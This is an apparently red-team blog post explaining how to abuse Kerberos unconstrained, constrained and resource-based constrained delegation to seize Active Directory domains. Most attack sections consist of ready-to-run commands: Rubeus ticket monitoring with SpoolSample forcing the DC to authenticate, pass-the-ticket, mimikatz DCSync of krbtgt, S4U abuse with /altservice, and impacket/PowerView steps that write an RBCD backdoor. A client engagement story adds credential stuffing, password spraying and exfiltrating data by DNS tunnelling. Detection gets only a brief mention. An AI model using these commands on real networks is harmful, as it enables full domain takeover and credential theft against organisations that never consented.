Kerberos Delegation Abuse: Unconstrained, Constrained, and RBCD

2024-12-10 · 10 min read BloodHound · Rubeus · Impacket

I love Kerberos delegation. It's one of those things that sounds completely reasonable when someone explains why it exists — "the web server needs to access the database as the user, not as itself" — and then you think about it for five seconds and realise it's a privilege escalation goldmine.

Here's what happens: you compromise a service account that has delegation configured. Now you can impersonate users to other systems. Including domain admins. Including to domain controllers. The service account was supposed to have this ability. That's the whole point of delegation. But nobody ever said it couldn't be abused once we controlled that account.

There are three types of delegation: unconstrained (the scary one), constrained (the "we tried to fix it" one), and resource-based constrained delegation (the "actually we made it worse" one). Here's how each works and how to weaponise them.

Unconstrained Delegation: The TGT Caching Problem

Unconstrained delegation is the original implementation. When a user authenticates to a service with unconstrained delegation enabled, their TGT — their golden ticket to request service tickets for anything in the domain — gets included in the service ticket and cached on that system.

Why? So the service can impersonate them to other services. Makes sense for the use case. But if we have admin access to that system? We dump LSASS and grab every TGT that's been cached there. Including the domain controller's TGT if we can force it to authenticate to us.

The Print Spooler Trick

Find a system with unconstrained delegation. BloodHound will show you these — look for computers where unconstraineddelegation:true. Usually it's a Citrix server, a web app server, sometimes a print server. Occasionally — hilariously — it's every computer in the domain because someone enabled it domain-wide years ago and forgot.

Compromise that system and get local admin. Then run Rubeus in monitor mode and force DC authentication via the Print Spooler bug:

cmd / powershell
# Monitor for incoming TGTs
Rubeus.exe monitor /interval:5 /filteruser:DC01$

# Trigger DC authentication via Print Spooler
SpoolSample.exe DC01.corp.local UNCONSTRAINED-SERVER.corp.local

# DC's TGT appears in Rubeus output — pass it and DCSync
Rubeus.exe ptt /ticket:[base64-ticket]
mimikatz "lsadump::dcsync /user:krbtgt"

The domain controller authenticates. Its TGT appears in Rubeus output. We pass-the-ticket, and now we're the domain controller. DCSync, golden ticket, domain admin — game over.

Unconstrained delegation has no restrictions on what you can impersonate or where you can use those credentials. It's delegation with a blank cheque.

Constrained Delegation: Microsoft Tried

Microsoft realised unconstrained delegation was a problem. So they introduced constrained delegation: you can only impersonate users to specific services, defined by SPN. If a service is configured for constrained delegation to MSSQLSvc/sqlserver.corp.local, it can only request service tickets for that SQL instance on behalf of users.

Except that's not quite true.

S4U2Self and S4U2Proxy

Constrained delegation uses two Kerberos extensions. S4U2Self lets a service request a service ticket to itself on behalf of any user — without that user ever authenticating. S4U2Proxy lets the service take that ticket and request a service ticket to the target service on the user's behalf.

If the service account is configured with TRUSTED_TO_AUTH_FOR_DELEGATION (protocol transition), we can abuse this to impersonate domain admin without them ever authenticating anywhere:

powershell / rubeus
# S4U2Self as Administrator, then S4U2Proxy to constrained target
Rubeus.exe s4u /user:svc_webapp /rc4:<NTLMHASH> \
  /impersonateuser:administrator \
  /msdsspn:MSSQLSvc/sqlserver.corp.local /ptt

The SPN Doesn't Actually Matter

Here's the fun part: the constrained delegation restriction is by SPN. But when you request a service ticket, you can request it for any service class on that host using the /altservice flag. Delegation is configured to HTTP — but we can request CIFS, HOST, or LDAP:

rubeus
# Delegation configured to CIFS — request LDAP instead (DCSync)
Rubeus.exe s4u /user:sqlsvc /rc4:<NTLMHASH> \
  /impersonateuser:administrator \
  /msdsspn:CIFS/dc01.corp.local \
  /altservice:LDAP /ptt

# Now DCSync with the impersonated ticket
mimikatz "lsadump::dcsync /domain:corp.local /user:krbtgt"

Constrained delegation is barely a constraint.

Resource-Based Constrained Delegation: Write Your Own Backdoor

RBCD flips the delegation model. Instead of the service account having a list of what it can delegate to, the target has a list of what accounts are allowed to delegate to it. This is stored in msDS-AllowedToActOnBehalfOfOtherIdentity on computer objects.

The exploitation path: if you have GenericWrite, GenericAll, or WriteProperty on a computer object, you can modify that attribute. You can add yourself to the delegation list. You're writing your own constrained delegation configuration, on demand, for any computer you have write access to.

The Attack

BloodHound shows you write access to computer objects. You need to control an account with an SPN — if you don't have one, create a computer account (MachineAccountQuota usually allows 10 per user by default):

impacket / powershell
# Create a controlled computer account with a known password
impacket-addcomputer -computer-name 'ATTACK$' \
  -computer-pass 'ComplexPass123!' \
  -dc-ip 10.0.0.1 corp.local/user:password

# Configure RBCD on the target, adding our computer account
$SD = New-Object Security.AccessControl.RawSecurityDescriptor \
  "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;[SID-of-ATTACK$])"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

Set-DomainObject -Identity TARGET$ \
  -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}

# S4U as administrator on the target
Rubeus.exe s4u /user:ATTACK$ /rc4:<HASH> \
  /impersonateuser:administrator \
  /msdsspn:cifs/target.corp.local /ptt

We're now administrator on the target system. No privileged account ever authenticated anywhere. We just modified Active Directory configuration to grant ourselves delegation rights.

Finding Delegation Opportunities

BloodHound is your primary tool — run it in every domain you compromise. It shows unconstrained delegation computers, constrained delegation accounts, and write access to msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD opportunities.

cypher (bloodhound)
// Find unconstrained delegation (excluding DCs)
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name ENDS WITH 'DC01$'
RETURN c

// Find constrained delegation accounts
MATCH (u) WHERE u.allowedtodelegate IS NOT NULL
RETURN u
powershell (powerview)
# Unconstrained
Get-DomainComputer -Unconstrained | Select-Object name,dnshostname

# Constrained delegation (users and computers)
Get-DomainUser -TrustedToAuth | Select-Object samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object name,msds-allowedtodelegateto

Real Engagement: Citrix Server with Unconstrained Delegation

Financial services client. 8,000 users, mature security team, EDR everywhere, SIEM with actual analysts watching it.

Day 1–2: Initial access via credential stuffing — found valid creds from a breach database. Got a marketing user account.

Day 3: Ran SharpHound from the user's workstation during their lunch break. Pulled BloodHound data back through DNS tunnelling (decent egress filtering). Found: CITRIX-APP-01 with unconstrained delegation. Not a domain controller — a Citrix Virtual Apps server hosting published applications for the finance team.

Day 4: Lateral movement was the hard part. Couldn't get local admin on the Citrix server with any account we had. Eventually found RDP credentials stored in Chrome on a different user's laptop. Password-sprayed that credential across other systems — it was the same local admin password on 40+ workstations. Got onto CITRIX-APP-01. Ran Rubeus monitor. Waited.

Three hours later: Captured TGTs for a dozen users, two helpdesk admins, and — jackpot — a domain admin who launched a published Citrix app. Pass-the-ticket. DCSync. Done.

The unconstrained delegation on the Citrix server was configured during initial deployment in 2016. Someone checked a box in the deployment wizard, probably didn't understand what it did, and it stayed there for eight years. Total time from initial access to domain admin: 36 hours. Most of that was waiting for the DA to authenticate.

What You Actually Need to Remember

  • Unconstrained: TGTs get cached. Force DC authentication with SpoolSample. Extract TGTs with Rubeus. Impersonate anyone to anything. Fastest path to DA if you can find it.
  • Constrained: S4U2Self + S4U2Proxy = impersonation without authentication. The /altservice flag bypasses SPN restrictions. If TRUSTED_TO_AUTH_FOR_DELEGATION is set, you can impersonate anyone.
  • RBCD: GenericWrite on a computer object = configure your own delegation. Create a computer account, modify msDS-AllowedToActOnBehalfOfOtherIdentity, S4U to the target.
  • Detection: Event 4769 shows S4U requests but is too noisy for most environments to alert on. RBCD modification shows up in Event 5136 but almost nobody monitors computer object changes.
Check for delegation early in every engagement. If it's there — and it usually is — prioritise it. It's reliable, fast, and most environments have no detection for it at all.
